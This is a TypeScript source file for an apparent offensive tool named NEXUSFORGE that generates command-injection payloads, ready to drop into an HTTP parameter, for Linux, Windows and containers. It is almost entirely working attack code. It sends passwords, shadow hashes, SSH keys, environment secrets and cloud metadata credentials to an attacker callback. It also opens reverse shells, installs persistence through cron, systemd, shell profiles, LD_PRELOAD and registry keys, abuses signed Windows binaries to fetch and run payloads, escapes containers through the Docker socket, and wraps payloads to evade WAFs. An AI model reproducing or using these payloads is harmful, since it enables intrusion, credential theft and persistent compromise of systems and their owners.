/* ═══════════════════════════════════════════════════════════════════════════
   NEXUSFORGE — Auto-Delivery Chain Engine
   Solves the "pre-existing RCE required" problem:
   Every payload here is injection-READY — formatted to go directly into
   an HTTP GET/POST parameter and execute+deliver in one shot.
   No pre-existing shell access needed.
   ═══════════════════════════════════════════════════════════════════════════ */

const IFS = "${IFS}";

function b64(s: string): string { return Buffer.from(s).toString("base64"); }
function hexEsc(s: string): string {
  return [...Buffer.from(s)].map(b => `\\x${(b as number).toString(16).padStart(2,"0")}`).join("");
}
function urlEncode(s: string): string {
  return [...Buffer.from(s)].map(b => `%${(b as number).toString(16).padStart(2,"0").toUpperCase()}`).join("");
}

export interface InjectionPayload {
  id:                string;
  name:              string;
  category:          string;
  technique:         string;
  os:                "linux" | "windows" | "any";
  raw:               string;   // the raw command
  injectionValue:    string;   // drop-in injection param value (can go in ?cmd=HERE)
  ifsEncoded:        string;   // IFS-bypassed (beats simple space-based WAF)
  b64Wrapped:        string;   // base64-decode execution (beats keyword WAF)
  hexWrapped:        string;   // hex-encode execution
  successIndicators: string[]; // regex/strings to look for in response
  notes:             string;
}

function wrapIfs(cmd: string): string {
  return cmd.replace(/ /g, IFS);
}

function wrapB64(cmd: string): string {
  return `{echo,${b64(cmd)}}|{base64,-d}|{bash,}`;
}

function wrapHex(cmd: string): string {
  return `bash${IFS}-c${IFS}"$(printf${IFS}'${hexEsc(cmd)}')"`;
}

function makePayload(
  id: string,
  name: string,
  category: string,
  technique: string,
  os: "linux" | "windows" | "any",
  raw: string,
  successIndicators: string[],
  notes: string,
): InjectionPayload {
  return {
    id, name, category, technique, os,
    raw,
    injectionValue:  `$(${raw})`,
    ifsEncoded:      `$(${wrapIfs(raw)})`,
    b64Wrapped:      `$(${wrapB64(raw)})`,
    hexWrapped:      `$(${wrapHex(raw)})`,
    successIndicators,
    notes,
  };
}

/* ── Injection-ready exfil payloads ──────────────────────────────────────── */
export function buildInjectionReadyExfil(cbUrl: string, token: string): InjectionPayload[] {
  const cb = `${cbUrl}/${token}`;
  return [
    makePayload(
      "inj_passwd", "Inject+Exfil /etc/passwd", "Credentials", "HTTP OOB", "linux",
      `curl -sk -X POST "${cb}?f=passwd" --data-binary @/etc/passwd`,
      ["uid=", "root:x:"],
      "Injects directly via HTTP param — no pre-existing shell needed. Response contains passwd if RCE confirmed.",
    ),
    makePayload(
      "inj_environ", "Inject+Exfil Process Environ", "Secrets", "HTTP OOB", "linux",
      `curl -sk -X POST "${cb}?f=environ" --data-binary @/proc/self/environ`,
      ["DATABASE_URL", "SECRET", "TOKEN", "PASSWORD"],
      "Exfiltrates runtime environment (secrets, DB URLs, tokens) via injection.",
    ),
    makePayload(
      "inj_env_secrets", "Inject+Exfil Secret ENV Vars", "Secrets", "HTTP OOB", "linux",
      `env | grep -iE '(pass|secret|key|token|api|cred|auth|db|jwt|bearer|hmac|private|signing|encrypt|dsn|redis|mongo|rabbit|elastic|stripe|twilio|sendgrid|github|slack)' | curl -sk -X POST "${cb}?f=secrets" --data-binary @-`,
      ["KEY=", "SECRET=", "TOKEN=", "PASS="],
      "Filters + exfiltrates only high-value env vars. Minimal data = faster exfil.",
    ),
    makePayload(
      "inj_shadow", "Inject+Exfil /etc/shadow", "Credentials", "HTTP OOB", "linux",
      `curl -sk -X POST "${cb}?f=shadow" --data-binary @/etc/shadow 2>/dev/null || sudo cat /etc/shadow 2>/dev/null | curl -sk -X POST "${cb}?f=shadow" --data-binary @-`,
      ["$6$", "$y$", "$5$"],
      "Exfiltrates hashed passwords. Requires root or shadow group.",
    ),
    makePayload(
      "inj_aws_imdsv2", "Inject+Exfil AWS IAM Creds", "Cloud", "IMDS v2", "linux",
      `_T=$(curl -sk -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds:21600");_R=$(curl -sk -H "X-aws-ec2-metadata-token:$_T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/");curl -sk -H "X-aws-ec2-metadata-token:$_T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_R" | curl -sk -X POST "${cb}?f=aws_iam" --data-binary @-`,
      ["AccessKeyId", "SecretAccessKey", "Token"],
      "Full IMDSv2 chain: gets metadata token → role name → live IAM credentials.",
    ),
    makePayload(
      "inj_aws_imdsv1", "Inject+Exfil AWS IMDSv1 (fallback)", "Cloud", "IMDS v1", "linux",
      `_R=$(curl -sk "http://169.254.169.254/latest/meta-data/iam/security-credentials/");curl -sk "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_R" | curl -sk -X POST "${cb}?f=aws_imdsv1" --data-binary @-`,
      ["AccessKeyId", "SecretAccessKey"],
      "IMDSv1 fallback — no token header required.",
    ),
    makePayload(
      "inj_gcp_token", "Inject+Exfil GCP SA Token", "Cloud", "GCP IMDS", "linux",
      `curl -sk -H "Metadata-Flavor:Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | curl -sk -X POST "${cb}?f=gcp_token" --data-binary @-`,
      ["access_token", "token_type"],
      "Fetches live GCP OAuth token for service account API access.",
    ),
    makePayload(
      "inj_azure_token", "Inject+Exfil Azure IMDS Token", "Cloud", "Azure IMDS", "linux",
      `curl -sk -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" | curl -sk -X POST "${cb}?f=azure_token" --data-binary @-`,
      ["access_token", "Bearer"],
      "Azure managed identity OAuth token for Azure Resource Manager.",
    ),
    makePayload(
      "inj_ssh_keys", "Inject+Exfil SSH Private Keys", "Credentials", "File Read", "linux",
      `find /root /home ~/.ssh /etc/ssh 2>/dev/null -maxdepth 4 \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' -o -name '*.key' \\) 2>/dev/null | while read k; do echo "=== $k ==="; cat "$k" 2>/dev/null; done | curl -sk -X POST "${cb}?f=ssh_keys" --data-binary @-`,
      ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY", "BEGIN EC PRIVATE KEY"],
      "Hunts all SSH private keys across user home dirs and system SSH dirs.",
    ),
    makePayload(
      "inj_k8s_token", "Inject+Exfil K8s SA Token", "Container", "K8s API", "linux",
      `{ cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo '---'; curl -sk -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)" https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null|head -200; } | curl -sk -X POST "${cb}?f=k8s_token" --data-binary @-`,
      ["eyJ", "namespace", "kubernetes"],
      "K8s service account JWT + namespace enumeration.",
    ),
    makePayload(
      "inj_docker_sock", "Inject via Docker Socket → Host Escape", "Container", "Docker API", "linux",
      `curl -sk --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H 'Content-Type:application/json' -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow | curl -sk -X POST ${cb}?f=docker_escape --data-binary @-"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' 2>/dev/null`,
      ["Id", "container"],
      "Creates privileged Alpine container with host / mounted — reads shadow from host.",
    ),
    makePayload(
      "inj_sysinfo", "Inject+Exfil Full System Recon", "Recon", "HTTP OOB", "linux",
      `(id;uname -a;hostname;whoami;cat /etc/os-release 2>/dev/null;ip addr 2>/dev/null||ifconfig 2>/dev/null;df -h;free -m;cat /proc/cpuinfo|grep 'model name'|head -2;ps aux|head -20) | curl -sk -X POST "${cb}?f=sysinfo" --data-binary @-`,
      ["uid=", "Linux", "inet"],
      "Full recon in one injection: id, kernel, hostname, IPs, disk, memory, processes.",
    ),
    makePayload(
      "inj_web_configs", "Inject+Exfil Web App Secrets", "Secrets", "File Read", "linux",
      `for f in /var/www/html/.env /var/www/.env /app/.env /srv/.env /opt/app/.env /home/*/.env /etc/app/.env $(find /var/www /app /srv /opt 2>/dev/null -maxdepth 4 -name '.env' -o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' 2>/dev/null | head -12); do [ -f "$f" ] && { echo "=== $f ==="; cat "$f" 2>/dev/null; }; done | curl -sk -X POST "${cb}?f=web_configs" --data-binary @-`,
      ["DB_PASSWORD", "SECRET_KEY", "DATABASE_URL", "APP_KEY"],
      "Hunts .env, config.php, database.yml, settings.py across all web root locations.",
    ),
    /* Windows injection-ready exfil */
    makePayload(
      "win_inj_whoami", "WIN Inject+Exfil whoami+hostname", "Recon", "PowerShell OOB", "windows",
      `powershell -NonI -W Hidden -Exec Bypass -c "Invoke-WebRequest -Uri '${cb}?f=win_recon' -Method POST -Body ((whoami)+' '+(hostname)+' '+(ipconfig))"`,
      ["NT AUTHORITY", "DESKTOP-", "192.168."],
      "Windows PowerShell injection-ready exfil — exfiltrates whoami, hostname, ipconfig.",
    ),
    makePayload(
      "win_inj_env", "WIN Inject+Exfil Secret ENV Vars", "Secrets", "PowerShell OOB", "windows",
      `powershell -NonI -W Hidden -Exec Bypass -c "$s=([Environment]::GetEnvironmentVariables()|Out-String);Invoke-WebRequest -Uri '${cb}?f=win_env' -Method POST -Body $s"`,
      ["USERNAME=", "COMPUTERNAME=", "PATH="],
      "Exfiltrates all Windows environment variables via PowerShell.",
    ),
    makePayload(
      "win_inj_creds", "WIN Inject+Exfil SAM/LSA Hint", "Credentials", "PowerShell OOB", "windows",
      `powershell -NonI -W Hidden -Exec Bypass -c "$r=reg query HKLM\\SAM\\SAM\\Domains\\Account\\Users 2>&1|Out-String;Invoke-WebRequest -Uri '${cb}?f=win_sam' -Method POST -Body $r"`,
      ["Users", "Account"],
      "Queries SAM registry hive for user account hints. Requires SYSTEM for full dump.",
    ),
  ];
}

/* ── Injection-ready persistence payloads ────────────────────────────────── */
export function buildInjectionReadyPersist(lhost: string, lport: string): InjectionPayload[] {
  const cbsh  = `http://${lhost}:${lport}/sh`;
  const cbpl  = `http://${lhost}:${lport}/payload`;
  const revB64 = b64(`bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`);

  return [
    makePayload(
      "inj_cron_root", "Inject→Install Root Cron Reverse Shell", "Persistence", "crontab", "linux",
      `(crontab -l 2>/dev/null; echo "*/1 * * * * bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'") | crontab -`,
      [],
      "Installs a cron job via injection — fires every minute. Persists across reboots.",
    ),
    makePayload(
      "inj_cron_b64", "Inject→Install Cron (B64, WAF bypass)", "Persistence", "crontab", "linux",
      `(crontab -l 2>/dev/null; echo "*/1 * * * * {echo,${revB64}}|{base64,-d}|{bash,}") | crontab -`,
      [],
      "B64-encoded cron payload — bypasses string-match WAFs looking for /dev/tcp.",
    ),
    makePayload(
      "inj_systemd_timer", "Inject→Install systemd Service+Timer", "Persistence", "systemd", "linux",
      `printf '[Unit]\nDescription=svc\n[Service]\nType=oneshot\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/nexusfw.service && printf '[Unit]\nDescription=nxt\n[Timer]\nOnBootSec=30\nOnUnitActiveSec=60\n[Install]\nWantedBy=timers.target' > /etc/systemd/system/nexusfw.timer && systemctl daemon-reload && systemctl enable --now nexusfw.timer 2>/dev/null`,
      [],
      "Installs a systemd service + timer. Fires 30s after boot, every 60s. Survives reboots. Requires root.",
    ),
    makePayload(
      "inj_ssh_pubkey", "Inject→Add SSH Authorized Key", "Persistence", "SSH", "linux",
      `mkdir -p ~/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+nexusforge" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`,
      [],
      "Adds an SSH public key — replace with your real public key for password-less SSH access.",
    ),
    makePayload(
      "inj_bash_profile", "Inject→Backdoor .bash_profile", "Persistence", "Bash Profile", "linux",
      `echo "nohup bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' &>/dev/null &" >> ~/.bash_profile && echo "nohup bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' &>/dev/null &" >> ~/.bashrc && echo "nohup bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' &>/dev/null &" >> ~/.profile`,
      [],
      "Fires reverse shell on every login. Written to bash_profile, bashrc, and profile for redundancy.",
    ),
    makePayload(
      "inj_motd", "Inject→MOTD Backdoor", "Persistence", "MOTD", "linux",
      `echo 'nohup bash -c "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1" &>/dev/null &' > /etc/update-motd.d/99-nexus && chmod +x /etc/update-motd.d/99-nexus`,
      [],
      "Fires on every SSH login via update-motd.d. Requires root.",
    ),
    makePayload(
      "inj_ld_preload", "Inject→LD_PRELOAD Persistence", "Persistence", "LD_PRELOAD", "linux",
      `echo "LD_PRELOAD=/tmp/.nx.so" >> /etc/environment && printf '#include<stdio.h>\n#include<stdlib.h>\nvoid __attribute__((constructor)) nx(){system("bash -i >& /dev/tcp/${lhost}/${lport} 0>&1 &");}' > /tmp/.nx.c && gcc -shared -fPIC -nostartfiles /tmp/.nx.c -o /tmp/.nx.so 2>/dev/null`,
      [],
      "Compiles a constructor .so and loads it system-wide. Fires on every process start. Requires root + gcc.",
    ),
    makePayload(
      "inj_wget_persist", "Inject→Fetch+Execute Persistent Payload", "Persistence", "Delivery", "linux",
      `mkdir -p /tmp/.svc && curl -fsSL "${cbpl}" -o /tmp/.svc/.nx 2>/dev/null || wget -qO /tmp/.svc/.nx "${cbpl}" 2>/dev/null; chmod +x /tmp/.svc/.nx 2>/dev/null; /tmp/.svc/.nx 2>/dev/null &`,
      [],
      "Downloads and executes your hosted payload. Host a reverse shell or implant on lhost:lport/payload.",
    ),
    makePayload(
      "inj_curl_pipe", "Inject→Curl Pipe Bash (One-Shot Delivery)", "Persistence", "Pipe Exec", "linux",
      `curl -fsSL "${cbsh}" 2>/dev/null | bash || wget -qO- "${cbsh}" 2>/dev/null | bash || python3 -c "import urllib.request;exec(urllib.request.urlopen('${cbsh}').read())" 2>/dev/null`,
      [],
      "Tries curl → wget → python3 to fetch and execute your shell script. Maximises delivery success.",
    ),
    makePayload(
      "inj_devtcp_persist", "Inject→Pure Bash /dev/tcp Delivery", "Persistence", "Bash Dev/TCP", "linux",
      `exec 3<>/dev/tcp/${lhost}/${lport};printf 'GET /sh HTTP/1.0\\r\\nHost:${lhost}\\r\\n\\r\\n' >&3;tail -n +6 <&3 | bash`,
      [],
      "Zero external tools — uses pure bash /dev/tcp. Downloads and executes your shell script.",
    ),
    makePayload(
      "inj_openssl_persist", "Inject→OpenSSL TLS Delivery", "Persistence", "OpenSSL", "linux",
      `openssl s_client -quiet -connect ${lhost}:${lport} 2>/dev/null < <(printf 'GET /sh HTTP/1.0\\r\\nHost:${lhost}\\r\\n\\r\\n') | tail -n +6 | bash`,
      [],
      "TLS-encrypted payload delivery via openssl when curl/wget are blocked.",
    ),
    /* Windows injection-ready persistence */
    makePayload(
      "win_inj_schtask", "WIN Inject→Scheduled Task (Every Minute)", "Persistence", "schtasks", "windows",
      `powershell -NonI -W Hidden -Exec Bypass -c "schtasks /Create /SC MINUTE /MO 1 /TN NXSvc /TR 'powershell -NonI -W Hidden -Exec Bypass -c (New-Object Net.WebClient).DownloadString(\\\"${cbsh}\\\") | IEX' /F"`,
      [],
      "Creates a scheduled task that fires every minute and downloads+executes your shell script.",
    ),
    makePayload(
      "win_inj_reg_run", "WIN Inject→Registry Run Key Persistence", "Persistence", "Registry", "windows",
      `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v NXSvc /t REG_SZ /d "powershell -NonI -W Hidden -Exec Bypass -c (New-Object Net.WebClient).DownloadString('${cbsh}') | IEX" /f`,
      [],
      "HKCU Run key — fires on login. No admin required.",
    ),
  ];
}

/* ── RCE auto-chain: probe + exfil in one injection ─────────────────────── */
export function buildRCEAutoChain(cbUrl: string, token: string, lhost: string, lport: string): InjectionPayload[] {
  const cb = `${cbUrl}/${token}`;
  return [
    makePayload(
      "rce_chain_full", "RCE→Recon→Exfil (Full One-Shot)", "RCE Chain", "HTTP OOB", "linux",
      `_O=$(id;uname -a;hostname;whoami;cat /etc/os-release 2>/dev/null|head -3;ip addr 2>/dev/null|grep 'inet ';df -h|tail -3;env|grep -iE '(pass|secret|key|token|api|cred|db_|database|jwt|bearer|stripe|mongo|redis|rabbit|elastic)' 2>/dev/null);curl -sk -X POST "${cb}?f=rce_full" --data-binary "$_O" &`,
      ["uid=", "Linux"],
      "One-shot: runs full recon, filters secrets from env, exfiltrates everything via OOB. Backgrounded so the web app doesn't time out.",
    ),
    makePayload(
      "rce_chain_exfil_and_shell", "RCE→Exfil Secrets→Reverse Shell", "RCE Chain", "HTTP OOB", "linux",
      `(env|grep -iE '(pass|secret|key|token|api|cred|auth|db|jwt|bearer)' | curl -sk -X POST "${cb}?f=secrets" --data-binary @- &); nohup bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' &>/dev/null &`,
      ["uid=", "id="],
      "Exfiltrates secrets and immediately opens reverse shell in parallel — no waiting.",
    ),
    makePayload(
      "rce_chain_cloud", "RCE→Cloud Meta Dump→Exfil", "RCE Chain", "Cloud", "linux",
      `{ _T=$(curl -sk -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds:21600" 2>/dev/null); _R=$(curl -sk -H "X-aws-ec2-metadata-token:$_T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null); _CREDS=$(curl -sk -H "X-aws-ec2-metadata-token:$_T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_R" 2>/dev/null); _GCP=$(curl -sk -m3 -H "Metadata-Flavor:Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null); _AZ=$(curl -sk -m3 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>/dev/null); echo "AWS=$_CREDS GCP=$_GCP AZ=$_AZ"; } | curl -sk -X POST "${cb}?f=cloud_all" --data-binary @- &`,
      ["AccessKeyId", "access_token"],
      "Probes AWS IMDSv2, GCP, Azure IMDS simultaneously. Exfiltrates whichever responds.",
    ),
    makePayload(
      "rce_chain_k8s", "RCE→K8s Escape→Exfil", "RCE Chain", "K8s", "linux",
      `{ _TOK=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _NS=$(curl -sk -H "Authorization: Bearer $_TOK" https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null); _SEC=$(curl -sk -H "Authorization: Bearer $_TOK" https://kubernetes.default.svc/api/v1/secrets 2>/dev/null); echo "TOKEN=$_TOK"; echo "NAMESPACES=$_NS"; echo "SECRETS=$_SEC"; cat /proc/1/cgroup 2>/dev/null; ls -la /var/run/docker.sock 2>/dev/null; capsh --print 2>/dev/null; } | curl -sk -X POST "${cb}?f=k8s_escape" --data-binary @- &`,
      ["eyJ", "namespace", "docker.sock"],
      "Dumps K8s SA token, enumerates cluster secrets/namespaces, checks for docker.sock and caps.",
    ),
    makePayload(
      "rce_chain_web_secrets", "RCE→Web Config Dump→Exfil", "RCE Chain", "File Read", "linux",
      `{ for d in /var/www /app /srv /opt /home; do find "$d" 2>/dev/null -maxdepth 5 \\( -name '.env' -o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' -o -name 'application.properties' -o -name 'appsettings.json' -o -name 'wp-config.php' \\) 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done; done; cat /proc/self/environ|tr '\\0' '\\n'; } | curl -sk -X POST "${cb}?f=web_secrets" --data-binary @- &`,
      ["DB_PASSWORD", "SECRET_KEY", "DATABASE_URL"],
      "Hunts all web config files + process env across all web roots. Exfiltrates in one shot.",
    ),
    makePayload(
      "rce_chain_privesc_check", "RCE→Privesc Recon→Exfil", "Privilege Escalation", "Auto Privesc", "linux",
      `{ echo "[SUID]"; find / -perm -4000 -type f 2>/dev/null|head -20; echo "[SUDO]"; sudo -l 2>/dev/null; echo "[CAPS]"; capsh --print 2>/dev/null; echo "[CRON]"; cat /etc/crontab 2>/dev/null; ls /etc/cron* 2>/dev/null; echo "[WRITABLE /etc]"; find /etc -writable -type f 2>/dev/null|head -10; echo "[NFS]"; cat /etc/exports 2>/dev/null; echo "[PATH]"; echo $PATH; echo "[PKGS]"; dpkg -l 2>/dev/null|tail -30||rpm -qa 2>/dev/null|tail -30; } | curl -sk -X POST "${cb}?f=privesc" --data-binary @- &`,
      ["SUID", "sudo", "NOPASSWD"],
      "Full privesc recon: SUID binaries, sudo rules, capabilities, writable /etc, cron, NFS exports.",
    ),
  ];
}

/* ── WAF-bypass wrapper for injection values ─────────────────────────────── */
export function buildWafBypassWrappers(payload: InjectionPayload): Record<string, string> {
  const raw = payload.raw;
  const B64 = b64(raw);
  return {
    direct:         `$(${raw})`,
    ifs:            `$(${raw.replace(/ /g, "${IFS}")})`,
    b64:            `$(echo${"\t"}${B64}|base64${"\t"}-d|bash)`,
    hex:            `$(bash -c "$(printf '${hexEsc(raw)}')")`,
    brace:          `$(${raw.replace(/ /g, ",")}|{bash,})`,
    b64nospace:     `$({echo,${B64}}|{base64,-d}|{bash,})`,
    ansi:           `$($'${[...Buffer.from(raw)].map(b => `\\x${(b as number).toString(16).padStart(2,"0")}`).join("")}')`,
    concat:         `$(ba""sh -c "${raw.replace(/"/g, '\\"')}")`,
    dollar_at:      `$("$@"<<<${JSON.stringify(raw)} _ bash)`,
    env_var:        `$(_NX=${JSON.stringify(raw)};bash -c "$_NX")`,
  };
}

export function buildWindowsDeliveryChains(lhost: string, lport: string): InjectionPayload[] {
  const cb = `http://${lhost}:${lport}`;
  return [
    makePayload("win_mshta_js","MSHTA JScript RCE (LOLBin)","Windows LOLBin","HTTP","windows",
      `mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -NonI -W Hidden -c \\"IEX(New-Object Net.WebClient).DownloadString(\\'${cb}/p.ps1\\')\\"',0,1);close()" 2>nul`,
      ["New-Object","IEX"],"MSHTA runs JScript → downloads PS1. Signed MS binary, bypasses AppLocker/WDAC in most orgs."),
    makePayload("win_regsvr32_scrobj","Regsvr32 COM Scriptlet squiblydoo","Windows LOLBin","HTTP","windows",
      `regsvr32.exe /s /n /u /i:${cb}/nx.sct scrobj.dll 2>nul`,
      ["Exec","ScriptletURL"],"Squiblydoo — Regsvr32 fetches SCT scriptlet and executes COM code. Signed MS binary, bypasses AppLocker."),
    makePayload("win_certutil_b64","CertUtil download+decode","Windows LOLBin","HTTP","windows",
      `certutil -urlcache -split -f "${cb}/nx.b64" C:\\Windows\\Temp\\nx.b64 && certutil -decode C:\\Windows\\Temp\\nx.b64 C:\\Windows\\Temp\\nx.exe && C:\\Windows\\Temp\\nx.exe 2>nul`,
      ["Saved","Decoded"],"CertUtil downloads and base64-decodes payload. Signed MS binary, second-stage in many APT chains."),
    makePayload("win_installutil_bypass","InstallUtil AppHost bypass","Windows LOLBin","HTTP","windows",
      `powershell -NonI -W Hidden -c "(New-Object Net.WebClient).DownloadFile('${cb}/nx.exe','$env:TEMP\\nx.exe');C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U '$env:TEMP\\nx.exe'" 2>nul`,
      ["MSI","Install"],"InstallUtil runs .NET assembly Uninstall() — bypasses AppLocker execution control."),
    makePayload("win_wmic_xsl","WMIC /format XSL transform RCE","Windows LOLBin","HTTP","windows",
      `wmic.exe process list /format:"${cb}/nx.xsl" 2>nul`,
      ["xsl","transform"],"WMIC /format downloads remote XSL with embedded JScript. Signed MS binary."),
    makePayload("win_odbcconf_dll","ODBCCONF REGSVR DLL load","Windows LOLBin","HTTP","windows",
      `odbcconf.exe /s /a {REGSVR ${cb}/nx.dll} 2>nul`,
      ["DLL","REGSVR"],"ODBCCONF REGSVR loads arbitrary DLL. Signed, bypasses most application controls."),
  ];
}

export function buildContainerDeliveryChains(lhost: string, lport: string): InjectionPayload[] {
  const cb = `http://${lhost}:${lport}`;
  return [
    makePayload("docker_socket_rce","Docker socket → privileged container","Container","Docker","linux",
      `curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sh","-c","curl -sk ${cb}/sh|sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true,"NetworkMode":"host"}}' | python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])" | xargs -I{} curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/{}/start"`,
      ["Id"],"Docker socket → privileged container with host / bind. Immediate host escape."),
    makePayload("k8s_sa_token_rce","K8s in-cluster SA token → pod exec","Container","K8s","linux",
      `_T=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _NS=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null||echo default); curl -sk -H "Authorization: Bearer $_T" "https://kubernetes.default.svc/api/v1/namespaces/$_NS/pods" | python3 -c "import sys,json;pods=json.load(sys.stdin).get('items',[]); print(pods[0]['metadata']['name'] if pods else 'NO_PODS')"`,
      ["metadata","name"],"K8s in-cluster SA token to enumerate pods in namespace."),
  ];
}

export function buildAllDeliveryChains(lhost: string, lport: string, cbUrl: string): InjectionPayload[] {
  return [
    ...buildLinuxDeliveryChains(lhost, lport, cbUrl),
    ...buildOobDeliveryChains(lhost, lport, cbUrl),
    ...buildWindowsDeliveryChains(lhost, lport),
    ...buildContainerDeliveryChains(lhost, lport),
  ];
}
